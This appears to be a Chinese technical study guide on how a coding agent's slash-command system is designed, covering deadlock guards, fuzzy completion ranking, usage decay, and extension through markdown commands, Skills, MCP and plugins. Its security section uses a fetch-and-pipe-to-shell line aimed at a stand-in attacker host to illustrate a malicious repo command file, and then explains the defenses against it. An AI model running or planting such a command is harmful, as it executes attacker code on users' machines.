| `onDone` 开头 | 命令调了两次 `onDone` | 第二次 `resolve` 静默无效（Promise 只 settle 一次），但 `setToolJSX(null)` 会执行两遍 |
| `.then(jsx)` 里 | 命令**先调 onDone 再 return JSX** | 界面被挂上去，但没人会关它 → **界面永久卡在屏幕上** |
| `.catch` 里 | onDone 成功了、但后续代码抛异常 | 覆盖掉正确结果，把成功报成失败 |
| `.catch` 整体存在 | ①② 两种异常路径 | **死锁**（本节主题） |

**第二处最阴，值得展开。** 有些命令的正常流程是「参数已经够了，
不需要问用户」——它会直接调 `onDone` 然后 return 一个 JSX（或者 null）：

```ts
// 一条命令的合法写法：早退路径
async call(onDone, ctx, args) {
  if (args === "sonnet") {
    setModel("sonnet");
    onDone("已切换到 sonnet");     // ← 已经完成了
    return null;                   // ← 但按签名还得返回点什么
  }
  return <ModelPicker onSelect={...} />;   // 需要用户选的路径
}
```

如果 `.then(jsx)` 不检查 `doneWasCalled`，遇到返回**非 null** 的早退命令时，
它会在命令已经"完成"之后把界面挂上去。**Promise 已经 resolve 了，
上层认为这条命令结束了，不会再有人来关这个界面。**

CC 侧的注释把这个后果记得更具体（CC 调研口径）：

```
Setting isLocalJSXCommand after clear leaves it stuck true,
blocking useQueueProcessor and TextInput focus.
```

翻译：那个"有交互式 UI 在显示"的标志位（§5.4 的第 2 个触发条件）
被卡在 `true` 了。后果是**队列处理器永远不工作 + 输入框永远拿不到焦点**——
从用户视角看，跟死锁一模一样。

#### 这一节的方法论

**「必须 resolve」是所有 callback-to-Promise 桥接的通用铁律。**
凡是你写了 `new Promise((resolve) => { ... })` 并把 `resolve` 交给别人调，
就必须回答：**有没有一条路径能让 resolve 永远不被调用？**

三个必查项：

1. **异常路径**：交出 `resolve` 之前/之后的代码抛了，谁来 resolve？
2. **早退路径**：对方在同步阶段就调了 resolve，后面的代码还会不会做多余的事？
3. **超时**：如果对方就是不调（第三种，界面 bug），有没有兜底？

第 3 项 sid-code 和 CC **都没做**。这是一个诚实的现状：
它们防住了引擎自己的两条异常路径，但「命令的界面代码写错了」这一类
仍然会导致卡死。**加超时的代价是要选一个数字**——用户可能真的想在
`/config` 面板里停留五分钟，任何超时都可能误杀。所以这里的取舍是
「宁可被一个写错的命令卡死，也不要误关一个用户正在用的面板」。

> **面试信号**：讲到这里能主动指出"第三类没防、以及为什么故意不防"，
> 比背出四处守卫更能证明你理解这个设计。**指出一个设计的边界，
> 比复述它的实现更难。**

### 6.4 `local` 路径：结果映射与递归确认

`local` 的执行很直接，有意思的是结果映射（实读）：

```ts
private mapLocalResult(result: LocalCommandResult): CommandExecutionResult {
  switch (result.type) {
    case "text":          return { type: "message", value: result.value };
    case "compact":       return { type: "compact", summary: result.summary };
    case "clear":         return { type: "clear" };
    case "quit":          return { type: "quit", message: result.message };
    case "dialog":        return { type: "dialog", dialog: result.dialog };
    case "submit_prompt": return { type: "submit_prompt", value: result.prompt, shouldQuery: true };
    case "confirm":
      return {
        type: "confirm",
        message: result.message,
        onConfirm: async () => this.mapLocalResult(await result.onConfirm()),  // ★ 递归
      };
    case "skip":          return { type: "skip" };
  }
}
```

**为什么要有这层映射，两个类型看起来几乎一样？**

因为它们的**受众不同**。`LocalCommandResult` 是**命令写给引擎**的
（"我要求清空对话"）；`CommandExecutionResult` 是**引擎写给应用层**的
（"请清空对话"）。两者今天长得像，但它们会各自演化——
比如引擎将来要加一个 `{ type: "passthrough" }`（§5.1 那个），
那是引擎的概念，命令根本不该知道它存在。

**判据：两个类型即使字段完全一样，只要它们的变更理由不同，就不该合并。**
（这是「单一职责」在类型层面的形态。）

`confirm` 那条的**递归**很漂亮：`onConfirm()` 返回的还是 `LocalCommandResult`，
所以要再映射一次。这让"确认之后可以做任何事"（包括再确认一次）
不需要任何额外机制：

```
/dangerous-thing
  → { confirm: "确定？", onConfirm: () => ({ confirm: "真的确定？", onConfirm: ... }) }
      两级确认，零新增代码
```

### 6.5 `prompt` 路径：三段顺序是铁律

§2.2 提过顺序铁律，这里看完整实现（实读，简化）：

```ts
private async executePrompt(cmd, args): Promise<CommandExecutionResult> {
  const skill = cmd.skill;
  let registeredHookCount = 0;

  if (skill) {
    // ① 权限判定
    const auth = authorizeSkill(skill, { permissionRules: this.ctx.permissionRules });
    if (auth.decision === "deny") return { type: "error", message: `权限拒绝：...` };
    if (auth.decision === "ask") {
      const allowed = await resolveSkillAsk(skill, ..., { confirm: this.ctx.requestUserConfirmation });
      if (!allowed) return { type: "error", message: `已取消：...` };
    }
    // ② 注册生命周期 hooks
    registeredHookCount = registerSkillLifecycleHooks(skill, this.ctx.hookSystem);
  }

  try {
    // ③ 生成 prompt 并执行
    const prompt = await cmd.getPromptForCommand(args, this.ctx);
    if (cmd.context === "fork") return await this.executeFork(cmd, prompt);
    registeredHookCount = 0;          // ★ inline：hooks 不卸载，见下
    if (skill) this.ctx.ctxMgr?.addInvokedSkill(skill.name, prompt);   // ★ 见下
    return { type: "submit_prompt", value: prompt, shouldQuery: true };
  } finally {
    // fork：hooks 作用域仅本次调用，返回后卸载
    if (registeredHookCount > 0 && skill && this.ctx.hookSystem) {
      this.ctx.hookSystem.removeSkillHooks(skill.name);
    }
  }
}
```

三个细节：

**① 顺序：权限 → hooks → 执行**（注释原文：「被拒的 skill 不能留下 hooks 污染后续工具调用」）。
这是个**只在拒绝路径上分叉**的陷阱——两种顺序在成功路径上表现完全一致。
这类 bug 的通用形态：**副作用注册在校验之前**。

**② inline 和 fork 的 hooks 生命周期不同**，靠那行 `registeredHookCount = 0` 区分：

```
fork  → hooks 只在子代理这一次调用期间有效 → finally 里卸载
inline → prompt 进了主对话，后面整段对话都可能触发这些 hooks → 不卸载
         （置 0 让 finally 跳过卸载，是个小技巧）
```

**判据：hooks 的作用域应该等于它要观测的那段执行的作用域。**
fork 的执行在子代理里，结束就结束了；inline 的"执行"是接下来的整段对话。

**③ `addInvokedSkill` 这行的注释记录了一个真实 bug**（实读）：

```
审计第 19 条：skill 来源的 inline 注入要上报 addInvokedSkill，
否则压缩丢弃旧消息后模型遗忘 skill 工作流指令
（ctxMgr 侧保留机制早已接线，缺的一直是喂数据这一侧）。
```

**「保留机制早已接线，缺的一直是喂数据这一侧」是一个极典型的失效形态**：

```
上下文压缩时要保留 skill 指令  →  ctxMgr 有这个能力 ✅
                              →  但没人调 addInvokedSkill ❌
                              →  能力在，永远拿不到数据 → 等于没有
```

症状：用户 `/some-skill` 之后聊了很久，触发一次自动压缩，
**模型突然忘了 skill 的工作流要求**。而排查时会看到"保留机制代码在啊"。

**这是 §2.3 那个「防线全在、调用全 0」的孪生形态**：
一半接线了，另一半没有。而**接线了的那一半会让你以为整件事是通的**。

同一段注释还指出了一个必须两处都做的点：

```
这条路径（UnifiedCommandRegistry → CommandExecutor）是 TUI 斜杠命令的真实路径，
与 SkillCommand.execute 并列，两者都要上报。
```

**同一个 skill 有两条用户调用路径**（新体系的 executor 和旧体系的 SkillCommand），
两条都要埋。只埋一条的后果是：**某些用户的某些调用方式下功能是坏的**，
而这取决于走的是哪套体系——最难复现的那类 bug。

### 6.6 本章自检

1. 为什么 `dispatch` 的 switch 刻意不写 `default`？
2. 埋点为什么埋在 `dispatch` 而不是 `executeSlashCommand`？漏了会怎样，
   你能发现吗？
3. `local-jsx` 那四处 `doneWasCalled` 检查各防什么？第二处（`.then(jsx)` 里）
   不加会出现什么症状？
4. 引擎防住了两类死锁路径，第三类（命令界面代码没有通向 onDone 的路径）
   为什么故意不防？
5. 「保留机制早已接线，缺的一直是喂数据这一侧」——这个失效形态的症状是什么？
   为什么排查时容易误判？

---
<a id="s7"></a>
## §7 发现与补全：上百条命令怎么让人找得到

### 7.1 前缀匹配为什么不够

第一直觉是 `commands.filter(c => c.name.startsWith(query))`。它处理不了四种真实输入：

```
/cmpct    ← 漏打字母。前缀匹配：零结果
/push     ← 想找 commit-push-pr。前缀匹配：零结果（push 不在开头）
/搜索      ← 不知道命令叫什么，只知道要干什么。前缀匹配：零结果
/q        ← exit 的别名。前缀匹配：不看别名，零结果
```

**四种都是"用户明确知道自己要什么，但工具装作不认识"** —— 这是最伤体感的一类失败。

### 7.2 解法：模糊搜索 + 加权字段

两个实现都用了 Fuse.js（一个纯 JS 的模糊搜索库）。sid-code 的配置（实读）：

```ts
const fuse = new Fuse(items, {
  includeScore: true,
  threshold: 0.5,          // 匹配宽松度（0=只要精确，1=什么都匹配）
  ignoreLocation: true,    // 不在乎匹配出现在字符串哪个位置
  keys: [
    { name: "name",        weight: 3   },   // 命令名最重要
    { name: "nameParts",   weight: 2   },   // commit-push-pr → [commit, push, pr]
    { name: "aliases",     weight: 2   },   // 别名
    { name: "description", weight: 0.5 },   // 描述最不重要
  ],
});
```

**四个字段各解决上面一种失败**：

| 字段 | 解决 | 怎么解决的 |
| --- | --- | --- |
| `name` | `/cmpct` | 模糊匹配本身容忍漏字母 |
| `nameParts` | `/push` | 名字按 `-`/`_` 切开，`push` 成了独立可搜的词 |
| `aliases` | `/q` | 别名一起进索引 |
| `description` | `/搜索` | 中文描述里有"搜索"，能命中 grep 命令 |

`nameParts` 那个切分是一行（实读）：`c.name.split(/[-_]/)`。
**一行代码解决一整类搜不到的问题**，性价比极高。

**权重的意思**：`name` 权重 3、`description` 权重 0.5 = 相差 6 倍。
所以用户敲 `com` 时，名字里有 `com` 的（`compact` `commit` `config`）
一定排在"描述里提到 com"的前面。**如果不加权，描述会淹没一切**——
描述比名字长十倍，随便一个字母都能在某条描述里命中。

### 7.3 但模糊搜索还不够：要在它之上叠一层确定性排序

**Fuse 的分数是不可解释的**。它给 `/com` → `compact` 打 0.13、
给 `config` 打 0.15，这个顺序对不对？说不清。而用户对某些情况有**明确期待**：

```
用户敲完整的 /compact，期待 compact 排第一 —— 这是不可协商的
```

所以要在 Fuse 结果之上叠一层五级优先级（实读）：

```ts
function getPriority(item: CommandSearchItem, query: string): number {
  if (item.name === query) return 1;                              // 精确名称
  if (item.aliases.includes(query)) return 2;                     // 精确别名
  if (item.name.startsWith(query)) return 3;                      // 前缀名称
  if (item.aliases.some((a) => a.startsWith(query))) return 4;     // 前缀别名
  return 5;                                                        // 纯模糊
}
```

**分档的意义：精确匹配永远压过模糊匹配，不管 Fuse 怎么打分。**
这把"不可解释的分数"关进了一个笼子——它只在同档内起作用。

完整的排序是四层，逐层 tiebreak（实读）：

```ts
.sort((a, b) => {
  if (a.priority !== b.priority) return a.priority - b.priority;      // ① 优先级档
  if (a.priority <= 4) {                                              // ② 名字更短的
    const lenDiff = a.item.name.length - b.item.name.length;
    if (lenDiff !== 0) return lenDiff;
  }
  const scoreDiff = a.score - b.score;                                // ③ Fuse 分数
  if (Math.abs(scoreDiff) > 0.1) return scoreDiff;                    //    （带死区）
  return getUsageScore(b.item.name) - getUsageScore(a.item.name);     // ④ 使用频率
})
```

两个细节值得学：

**② 为什么"名字更短的"排前面，而且只在前 4 档生效？**
用户敲 `/co`，`copy`（4 字符）比 `compact`（7 字符）更"接近"他打完的那个词——
短的命令名意味着用户已经打了更大比例。这条只在**前缀匹配**档内有意义
（第 5 档纯模糊时，名字长度说明不了任何事），所以有那个 `a.priority <= 4` 的限定。

**③ `Math.abs(scoreDiff) > 0.1` 是一个死区（deadband）。**
Fuse 分数差 0.02 是噪声，不该决定顺序。设死区让"分数接近时"落到下一层
（使用频率）去裁决。

**没有死区会怎样**：两条命令分数 0.13 和 0.14，永远是 0.13 那条在前，
即使用户天天用 0.14 那条。**死区把噪声让位给了信号。**

> **面试信号**：能讲出"为什么要在模糊搜索之上再叠确定性排序"
> 比"我们用了 Fuse.js"深两档。核心是一句话：
> **模糊匹配负责召回，确定性排序负责精度**——它们是两件事，不能指望一个库同时干。

### 7.4 使用频率：指数衰减，三个参数各有理由

排序的最后一层是"你平时爱用哪个"。实现是一个 7 天半衰期的指数衰减
（`usage-tracking.ts` 实读）：

```ts
const HALF_LIFE_DAYS = 7;
const MIN_DECAY_FACTOR = 0.1;
const DEBOUNCE_MS = 60_000;

export function getUsageScore(commandName: string, now = Date.now()): number {
  const record = loadStore()[commandName];
  if (!record) return 0;
  const daysSinceUse = (now - record.lastUsedAt) / DAY_MS;
  const recencyFactor = Math.pow(0.5, daysSinceUse / HALF_LIFE_DAYS);
  return record.usageCount * Math.max(recencyFactor, MIN_DECAY_FACTOR);
}
```

**先读懂这个公式**。`Math.pow(0.5, days/7)` 就是"每过 7 天打个对折"：

```
今天用过         → 0.5^0     = 1.0     （满值）
7 天前用过       → 0.5^1     = 0.5
14 天前用过      → 0.5^2     = 0.25
30 天前用过      → 0.5^4.3   = 0.05  → 被 MIN_DECAY_FACTOR 抬到 0.1
```

三个参数各解决一件事：

| 参数 | 值 | 不这么设会怎样 |
| --- | --- | --- |
| `HALF_LIFE_DAYS = 7` | 一周半衰 | 太长（如 90 天）→ 排序反映的是三个月前的习惯，改不动；太短（如 1 天）→ 昨天用过的今天就掉出去，排序天天变 |
| `MIN_DECAY_FACTOR = 0.1` | 最低保 10% | 不设下限 → 用过 100 次但一个月没碰的命令衰减到 0.05，**和从没用过的（0）几乎一样**，"不常用但重要"的命令彻底消失 |
| `DEBOUNCE_MS = 60_000` | 60 秒防抖 | 不防抖 → 每次补全都写一次配置文件（磁盘 IO + 可能的文件锁），而**7 天半衰期下分钟级精度毫无意义** |

**第三条是个漂亮的推理**：防抖的正当性不是"省 IO"（那只是收益），
而是"**这个精度本来就不需要**"。半衰期是 7 天，1 分钟内的时间差
对最终分数的影响在小数点后第五位。**省掉的是一个本来就无意义的精度。**

注意防抖只跳过**写盘**，内存计数照样加（实读）：

```ts
record.usageCount += 1;
record.lastUsedAt = now;
store[commandName] = record;        // ← 内存始终更新
const lastWrite = lastWriteByCommand.get(commandName);
if (lastWrite !== undefined && now - lastWrite < DEBOUNCE_MS) return;   // ← 只跳过写盘
```

**这个区分很重要**：如果连内存都跳过，60 秒内连按 5 次只算 1 次，
计数就错了。**防抖该防的是"落盘"这个昂贵动作，不是"记账"这个便宜动作。**

#### 一个容错细节

这个模块所有读写都吞异常（实读注释）：

```
注意：读写均同步且容错（文件不存在/损坏时退化为"无记录"），不抛错，
以免影响命令补全这条热路径。
```

**判据：这个功能的失败该有多严重？** 使用频率排序是个**优化**——
它坏了，用户拿到的是按字母序的补全列表，**依然可用**。
所以为它引入一个可能崩溃的路径是不值的。

反过来说：如果一个模块的失败会让核心功能不可用，就**不该**静默吞异常
（对照 §3.5 那个「降级为空数组」的取舍讨论）。

### 7.5 空输入：不搜索，改分类展示

用户只敲了一个 `/` 时，没有查询词可搜。这时改成按来源分类（实读）：

```
1. 最近使用（top 5，使用分数 > 0）
2. 内置命令（字母序）
3. Skills（字母序）
4. 自定义命令（字母序）
```

**为什么分类而不是"全部按使用频率排"？** 因为这时用户的意图不是"找某个命令"，
而是"**看看有什么**"。前者要精准排序，后者要**结构**——
分类让用户知道"哦，原来还有 Skills 这一类"。

**"最近使用 top 5"单独提到最前面**，解决的是另一个问题：
高频用户不需要浏览，他们只想快点选中那几个常用的。
**这两种用户（探索者 / 熟手）需要的东西不一样，分类 + 置顶同时服务了两者。**

### 7.6 中间位置补全：一个正则的性能坑

支持在输入中间敲命令，如 `help me /com`（`mid-input.ts` 实读，全文 37 行）：

```ts
export function findMidInputSlashCommand(input: string, cursorOffset: number) {
  if (input.startsWith("/")) return null;      // 行首 / 由主逻辑处理
  const beforeCursor = input.slice(0, cursorOffset);
  // 匹配：空白符 + / + 命令名字符，直到光标
  // 避免 lookbehind（在部分 JS 引擎中会导致 JIT 失败）
  const match = beforeCursor.match(/\s(\/[a-zA-Z0-9_:-]*)$/);
  ...
}
```

**注意那条注释**。"自然"的写法是用 lookbehind 断言：

```js
/(?<=\s)\/[a-zA-Z0-9_:-]*$/      // ❌ 语义更直白：前面是空白符，但不捕获它
/\s(\/[a-zA-Z0-9_:-]*)$/         // ✅ 实际用的：捕获空白符，再从结果里剥掉
```

CC 侧记录了具体原因（CC 调研口径）：

```
Lookbehind (?<=\s) is avoided — it defeats YARR JIT in JSC, and the
interpreter scans O(n) even with the $ anchor.
```

翻译：lookbehind 会让 JavaScriptCore（Bun 用的引擎）的正则 JIT 编译失败，
退回解释器逐字符扫描。**从 O(1) 退化到 O(n)。**

**为什么这里在乎？** 因为这个函数**每次按键都跑**。输入框里打 100 个字符，
它跑 100 次，每次扫描长度递增——总体 O(n²)。在长输入下会出现可感知的输入延迟。

**这一节的可迁移点不是"别用 lookbehind"**（在非热路径里它没问题），
而是：**热路径上的正则要考虑引擎的 JIT 能力，语义最直白的写法不一定是最快的。**
判据是"这段代码每次按键都跑吗"。

### 7.7 两级索引缓存：用引用当 key

`suggestions.ts` 里有两套索引（完整 `UnifiedCommand` 的，和 UI 层轻量结构的），
都用同一个缓存技巧（实读）：

```ts
if (indexCache?.commands === commands) {          // ★ 比引用，不比内容
  return { fuse: indexCache.fuse, items: indexCache.items };
}
```

§3.4 讲过这个技巧和它的前提，这里补一个它解决的具体问题：
**建 Fuse 索引不便宜**（要遍历所有命令、切分名字、建倒排结构），
而补全是每次按键都调。所以必须缓存，但缓存必须在命令列表变化时失效。

**用引用当 key 让失效变成自动的**：注册表重建列表 → 新数组 → 引用不同 → 索引重建。
不需要任何人记得调 `clearCache()`。

⚠️ 但它有前提（§3.4 提过）：**上层必须重建数组而不是原地修改**。
如果哪天有人写了 `commands.push(newCmd)`，引用没变，
**索引会静默停留在旧内容**——新命令搜不到，而且没有任何报错。

模块也提供了显式清除（`clearSuggestionsCache()`）作为逃生阀。
**这是对的：自动机制 + 手动逃生阀，比只有自动机制稳。**

### 7.8 本章自检

1. 四个搜索字段（name / nameParts / aliases / description）各解决哪一种"搜不到"？
2. 为什么要在 Fuse 分数之上再叠五级优先级？（一句话）
3. `Math.abs(scoreDiff) > 0.1` 这个死区不加会怎样？
4. `MIN_DECAY_FACTOR = 0.1` 保护的是哪一类命令？
5. 使用频率防抖为什么只跳过写盘、不跳过内存计数？
6. 用引用当缓存 key 的好处和前提各是什么？什么写法会让它静默失效？

---
<a id="s8"></a>
## §8 扩展面：用户写一个 `.md` 就成了一条命令

### 8.1 为什么要开放扩展

内置命令永远不够。理由不是"功能做不完"，而是**有一类需求我们根本不该知道**：

```
「/deploy-staging」        ← 这个团队的部署流程，只有他们知道
「/review-按我们的规范」   ← 每个团队的 code review 规范都不同
「/写个符合本项目风格的单测」← 项目风格藏在这个项目的代码里
```

这批需求的共同点：**它们的内容是项目知识，不是通用功能。**
唯一可行的形态是让用户自己写。

### 8.2 最低门槛的扩展：一个 markdown 文件

sid-code 的自定义命令就是 `.sid-code/commands/` 下的一个 `.md`：

```markdown
---
description: 按本项目规范审查改动
argument-hint: [文件路径]

请审查 @{docs/code-style.md} 里定义的规范，然后检查以下改动：

!{git diff --cached}

重点关注 $1 这个文件。
```

放好这个文件，`/review-ours` 就能用了。**零代码、零注册、零重启**
（`invalidateSkillCommands()` 那条路，§3.4）。

三种注入语法（`custom.ts` 实读），处理顺序是**参数 → 文件 → shell**：

| 语法 | 作用 | 例子 |
| --- | --- | --- |
| `$ARGUMENTS` / `$@` / `$*` / `{{args}}` | 全部参数 | 用户敲 `/x a b` → 展开成 `a b` |
| `$1` `$2` … | 第 N 个参数 | `$1` → `a` |
| `@{path}` | **文件内容**注入 | `@{README.md}` → 整个文件内容 |
| `!{cmd}` | **shell 输出**注入 | `!{git diff}` → diff 的内容 |

**为什么顺序是"参数 → 文件 → shell"？** 因为后面的可以用到前面的结果：
`@{$1}` 这种写法要求 `$1` 先被替换成真实路径。**顺序反了这个组合就不成立。**

### 8.3 ⚠️ `!{cmd}` 是一个真实的安全面

这个语法能执行任意 shell 命令。**想清楚它的攻击路径**：

```
`.sid-code/commands/` 在项目目录里 → 跟着 git 走
       ↓
你 clone 了一个仓库 → 里面有个 .sid-code/commands/helper.md
       ↓
文件内容：!{curl evil.com/x.sh | sh}
       ↓
你敲 /helper → 它就跑了
```

**这不是理论风险，它和"clone 下来的仓库里有恶意 npm postinstall 脚本"是同一类问题。**

sid-code 的三道防线（实读）：

**① 执行前必须用户确认**：

```ts
if (ctx.confirmShellCommands) {
  const confirmed = await ctx.confirmShellCommands(commands);
  if (!confirmed) return { result: template, confirmed: false };
}
```

注意它把**所有** shell 命令一次性收集后再确认——用户能看到完整清单，
而不是一条一条弹窗（一条条弹会训练出"闭眼点确认"的习惯）。

**② 执行有硬限制**：

```ts
const output = execSync(cmd, {
  encoding: "utf-8",
  timeout: 10_000,              // 10 秒
  maxBuffer: 10 * 1024 * 1024,  // 10MB
});
const truncated = output.length > 10000 ? output.slice(0, 10000) + "\n... [输出已截断]" : output;
```

三层保护，各防一件事：`timeout` 防挂死、`maxBuffer` 防内存爆、
`slice(0, 10000)` 防**上下文爆**（一个 `!{cat huge.log}` 能吃掉整个上下文窗口，
而且那些 token 每轮都要重发）。

**③ 企业策略能整体关掉**（`loadAll` 里，实读）：

```ts
if (!isPolicyAllowed("custom_commands")) {
  log.info("CUSTOM_CMD", "自定义命令已被企业策略禁用，跳过加载");
  return [];
}
```

这个闸门的**位置**有注释解释，是个好设计判断：

```
闸门放在 loadAll 而不是两个调用方（`command/loaders.ts` 的新命令系统 +
`cli.ts` 的 legacy 回退路径）：那样要写两遍，且日后第三个入口会静默绕过。
```

**「日后第三个入口会静默绕过」是这类闸门的标准失效形态。**
放在调用方 = 每加一个调用方就要记得加一次；放在被调方 = 天然覆盖所有入口。

**判据：安全闸门要放在"绕不过去"的那一层，不是"想得到"的那一层。**

⚠️ 但这里有个**结构性的**隐患，值得单独说清楚——注意它不是一个活的漏洞：

`confirmShellCommands` 在类型上是**可选的**（`ctx.confirmShellCommands?`），
而这段代码的形状是"有回调就确认，没有就直接跑"：

```ts
if (ctx.confirmShellCommands) {           // ← 没注入 → 整段跳过
  const confirmed = await ctx.confirmShellCommands(commands);
  if (!confirmed) return { result: template, confirmed: false };
}
execSync(cmd, { ... });                   // ← 无条件执行
```

**先说事实**：我核实了生产路径，这个回调**是注入的**
（`app.ts:7966` 注入真实弹窗，`adapter.ts` 在新旧体系间双向透传）。
所以今天没有一条用户路径会跳过确认。

**但把它和 Skill 侧对比就能看出问题**。同一个系统里，
Skill 的确认走 `resolveSkillAsk`，它的兜底是这样的（实读）：

```ts
if (opts.confirm)  { try { return await opts.confirm(desc); }
                     catch { log.warn("...保守拒绝"); return false; } }
if (opts.checker)  { try { ... } catch { log.warn("...保守拒绝"); return false; } }
// 无任何确认通道：保守拒绝（ask 不能静默放行）
log.warn("SKILL", `skill "${skill.name}" 需确认但无确认通道，拒绝执行`);
return false;
```

**三条兜底路径，全部 return false。** 连"回调自己抛异常"都保守拒绝。

于是同一个系统里出现了两种相反的默认取向：

| | 依赖缺失时 | 取向 |
| --- | --- | --- |
| Skill 确认（`resolveSkillAsk`） | 拒绝执行 | **fail-closed** ✅ |
| shell 注入确认（`processShellInjections`） | 直接执行 | **fail-open** ⚠️ |

**为什么这值得改，即使今天没坏**：它的正确性依赖"每一条现在和将来的调用路径
都记得注入那个回调"。而 §8.3 前面刚讲过那个企业策略闸门的教训——
"日后第三个入口会静默绕过"。**这里的形状恰好是同一个问题**，
只不过闸门那处放对了、这处放错了。

改法很小：把 `if (回调存在)` 反过来写成 `if (回调不存在) 拒绝执行`。
代价是零（生产路径本来就注入了），收益是把"安全"从约定变成结构。

**这也是 §9.9 会单独讲的形态**：两处代码各自读都很合理，
问题只在把它们放在一起看时才显现——**而没人会同时读这两个文件。**

### 8.4 Skill：比自定义命令重一档的扩展

Skill 也是磁盘上的 markdown（`SKILL.md`），但它能声明的东西多得多
（`skillToCommand` 实读）：

```ts
return {
  type: "prompt",
  name: skill.name,
  context,                              // inline / fork
  allowedTools: skill.allowedTools,     // 限制可用工具
  maxTurns: skill.maxTurns,             // 限制轮次
  timeoutMins: skill.timeoutMins,       // 限制时长
  userInvocable: skill.userInvocable !== false,
  disableModelInvocation: skill.disableModelInvocation,
  isEnabled: () => !skill.disabled && !(isGated?.(skill.name) ?? false),
  skill,                                // ★ 原始定义也带上，见下
  async getPromptForCommand(args, ctx) { return processSkillPrompt(...); },
};
```

**和自定义命令的关键差异**：

| | 自定义命令 | Skill |
| --- | --- | --- |
| 谁能调 | 只有用户 | **用户 + 模型**（双路径） |
| 能限制工具集吗 | 能（`allowed-tools`） | 能 |
| 能带 hooks 吗 | 不能 | **能**（生命周期 hooks） |
| 能条件激活吗 | 不能 | **能**（碰到某类文件才出现） |
| 权限判定 | 只有 shell 确认 | **完整的 allow/deny/ask** |

**因为 Skill 能做的事多，它需要的门控也多**——这是 §4 那五个字段
大部分是为 Skill 而存在的原因。

#### `skill` 字段为什么要把原始定义带上

注意 `skillToCommand` 返回的对象里挂了一个 `skill` 字段（把整个原始定义带上）。
这有点反常——投影出来的命令为什么还要留着源对象？注释解释了（实读）：

```
PromptCommand 只携带 prompt/allowedTools/maxTurns 等投影字段，信息不足。
挂原定义让 executor 能复用 skill/executor.ts 的同一套内核，避免两条路径实现漂移。
```

**「避免两条路径实现漂移」是这个设计的全部理由。** 展开看：

```
模型路径：SkillMetaTool → skill/executor.ts 的权限判定 + hooks 注册
用户路径：CommandExecutor → ???

如果用户路径自己写一套权限判定：
  → 今天两套逻辑一致
  → 明天改了模型路径那套，忘了改这套
  → 结果：同一个 skill，模型调它被拒，用户调它放行（或反过来）
  → 而且这个不一致**没有任何测试会发现**（两条路径的测试各自都过）
```

带上原始定义 → 两条路径调**同一个函数** → 漂移在结构上不可能发生。

**判据：当同一个能力有两条调用路径时，共享的应该是"实现"，不是"约定"。**
"我们两边都记得要判权限"是约定，会漂移；"两边调同一个 `authorizeSkill`"是实现，不会。

### 8.5 MCP 命令：外部进程提供的命令

MCP（Model Context Protocol）服务器可以暴露"prompt"，
sid-code 把每个都转成一条斜杠命令（`mcp-prompt-commands.ts` 实读）：

```ts
const name = `mcp__${normalizeMcpName(serverName)}__${normalizeMcpName(prompt.name)}`;
```

**命名格式 `mcp__<server>__<prompt>` 有三个作用**：

1. **天然隔离**：不可能和内置命令撞名（内置命令名里没有 `mcp__` 前缀）
2. **可溯源**：用户看到 `/mcp__github__review_pr` 就知道它从哪来
3. **normalize 过**：MCP 服务器名可能含 `/`、空格、点号，
   必须归一化成合法命令名字符（回到 §1.4 那个正则的约束）

#### 参数映射：两种形态都支持

MCP prompt 有具名参数（`{name: "repo", required: true}`）。
但用户在命令行敲的是一串自由文本。映射规则（实读）：

```ts
// 含 `=` 的 token 按 key=value 解析；其余按 prompt.arguments 顺序做位置映射
/mcp__github__review    repo=anthropic/sid   pr=123      ← 具名
/mcp__github__review    anthropic/sid  123               ← 位置
```

而且两种能混用——先解析所有 `key=value`，剩下的位置参数**跳过已被占用的名字**
依次填入。这个细节很小但很体贴：`/x pr=123 anthropic/sid` 也能工作。

#### 为什么它必须每次重建

`mcp-prompt-commands.ts` 的头部注释（实读）：

```
命令列表是动态的——服务器连接/断开、prompts/list_changed 后 getAllPrompts()
返回值随之变化。因此不做一次性注册，而是每次 getCommands 时按当前状态实时构建
```

回到 §3.7 那张"变化频率决定合并层"的图。MCP 是最外层，
因为它的变化频率最高——**而且变化不由我们控制**（外部进程说断就断）。

### 8.6 插件命令：唯一能热更新的来源

插件命令在 sid-code 里存成一份**独立快照**，不进 cwd 缓存（`unified-registry.ts` 实读）：

```ts
/**
 * 为什么不进 cwd 缓存：插件命令可通过 /reload-plugins 在运行时刷新，
 * 与 cwd 无关。这里维护一份独立快照，loadPlugins/reloadPlugins 时更新。
 */
private pluginCommands: UnifiedCommand[] = [];
```

**热更新有一个容易踩的两层缓存陷阱**（注释直接写了，回到 §3.4 的主题）：

```
前置条件：调用方需先执行 clearAllPluginCaches() 清除底层 getPluginCommands
的 memoize 缓存（由 refreshActivePlugins 负责），否则这里拿到的仍是旧快照。
```

```
/reload-plugins
    ↓
① clearAllPluginCaches()      ← 清底层 memoize。漏了这步 →
② registry.reloadPlugins()    ← 这里 loadPluginCommands() 拿回来的还是旧的
                                  而且**不报错**，用户以为刷新了
```

**这是 §3.4 那个多层缓存陷阱的第二次出现。** 两次出现在同一个系统的不同角落，
说明它不是偶然——**只要有两层缓存，就有一次"清了内层外层没动"的机会**。

**一个可操作的对策**：让"刷新"这个动作只有一个入口，把两步清理封在里面。
sid-code 这里是分开的（`refreshActivePlugins` 负责第一步，注册表负责第二步），
靠注释约定顺序——**这是能工作但脆弱的方案**，第三个调用方出现时容易漏。

### 8.7 六个来源汇总

把 §3 到 §8 的信息合成一张表：

| 来源 | 载体 | 命令类型 | 谁能调 | 变化频率 | 合并层 |
| --- | --- | --- | --- | --- | --- |
| 内置 | 代码 | 三型皆可 | 看门控 | 编译期固定 | `loadAllCommands`（缓存） |
| 用户自定义 | `~/.sid-code/commands/*.md` | `local`→submit_prompt | 仅用户 | 改文件需重载 | 同上 |
| 项目自定义 | `.sid-code/commands/*.md` | 同上 | 仅用户 | **跟 cwd 变** | 同上（key=cwd） |
| Skill | `SKILL.md` | `prompt` | **用户+模型** | 可条件激活/禁用 | 同上 |
| 插件 | 插件包 | `local` | 仅用户 | **可热更新** | 独立快照 |
| MCP | 外部进程 | `prompt`+inline | 仅用户 | **随时变** | 每次现场构建 |

**这张表的读法**：从上到下，「我们的控制力」递减，「变化频率」递增，
「合并点」越来越靠外。**这不是三个独立的巧合，是同一件事的三个侧面**——
你控制不了的东西变得快，变得快的东西不能缓存。

### 8.8 本章自检

1. 三种注入语法的处理顺序是"参数 → 文件 → shell"，反了会破坏什么组合？
2. `!{cmd}` 的攻击路径是什么？三道防线各防什么？
   那个 fail-open 的形状今天有没有造成漏洞，为什么仍然值得改？
3. 企业策略闸门为什么放在 `loadAll` 而不是两个调用方？
